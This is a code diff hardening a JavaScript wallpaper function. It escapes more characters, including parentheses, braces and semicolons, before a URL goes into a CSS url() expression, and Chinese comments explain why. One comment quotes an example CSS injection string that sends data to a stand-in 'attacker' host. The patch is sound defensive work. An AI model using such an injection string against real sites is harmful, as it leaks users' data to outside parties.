@@ -34,9 +34,14 @@
   function applyWallpaper(url, animate) {
     var bg = ensureBg();
     // 纵深防御:即便 url 来自 localStorage/后端响应(已过后端 save() 校验),
-    // 这里仍显式转义单引号/双引号/反斜杠,防止 backgroundImage 表达式被构造 CSS 注入
+    // 这里仍显式转义可逃出 CSS url() 表达式上下文的字符,防止 backgroundImage 被构造 CSS 注入。
+    // 关键修复:旧实现仅转义 '" \ 三个字符,但 CSS url() 上下文中 ) 是表达式结束符,
+    // 攻击者若能控制 localStorage(同源 XSS 可写入)或绕过后端校验,可构造
+    // url(') ; background: url(http://attacker/?leak=...)') 形式的 CSS 注入。
+    // 与服务端 wallpaper_service.py 的 _is_safe_url 危险字符集 [<>\"'\\)] 对齐,
+    // 同时补齐 ; { } ( 防 CSS 声明/规则块逃逸。
     if (typeof url === 'string') {
-      url = url.replace(/['"\\]/g, encodeURIComponent);
+      url = url.replace(/['"\\(){};]/g, encodeURIComponent);
     }
     bg.style.backgroundImage = "url('" + url + "')";
     if (animate !== false) {
